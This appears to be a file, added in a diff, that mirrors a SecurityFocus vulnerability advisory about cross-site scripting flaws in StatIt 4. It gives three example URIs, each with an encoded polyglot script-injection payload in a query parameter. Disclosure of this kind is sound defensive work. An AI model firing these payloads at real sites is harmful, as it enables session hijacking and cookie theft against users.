@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/51280/info
+
+StatIt is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+StatIt 4 is vulnerable; other versions may be affected. 
+
+The following example URIs are available:
+
+http://www.example.com/statit4/statistik.php?st_id=1&action=stat_last%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E&enc=333263120212292&agent=ari/534.30&PHPSESSID=14d0f57363caf5ef2d7fb1b56238dace&PHPSESSID=14d0f57363caf5ef2d7fb1b56238dace
+
+http://www.example.com/statit4/statistik.php?action=stat_tld&st_id=1&show=more%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\&PHPSESSID=d8679fc904017bdf6b09f5d88f7cf979
+
+http://www.example.com/statit4/statistik.php?action=stat_abfragen&st_id=1&show=more&order=2%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E&sort=1&PHPSESSID=698bf9d1e988e3af70022f1dfb86fd33
+
